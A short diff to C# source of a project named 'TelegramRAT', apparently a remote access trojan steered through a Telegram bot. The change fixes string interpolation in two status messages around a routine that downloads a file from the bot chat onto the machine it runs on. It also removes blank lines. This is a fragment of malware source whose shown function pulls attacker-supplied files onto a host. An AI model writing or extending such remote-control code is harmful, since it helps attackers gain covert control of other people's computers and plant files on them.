@@ -212,11 +212,11 @@ namespace TelegramRAT
             // Download file from chat
             } else
             {
-                sendText("📄 Downloading file: \"{file}\"");
+                sendText($"📄 Downloading file: \"{file}\"");
                 path = @"https://api.telegram.org/file/bot" + config.TelegramToken + "/" + path;
                 using (WebClient client = new WebClient())
                     client.DownloadFile(new Uri(path), file);
-                sendText("💾 File \"{file}\" saved in: \"{Path.GetFullPath(file)}\"");
+                sendText($"💾 File \"{file}\" saved in: \"{Path.GetFullPath(file)}\"");
             }   
         }
 
@@ -262,7 +262,5 @@ namespace TelegramRAT
         {
             sendText("🍀 Bot connected");
         }
-
-        
     }
 }
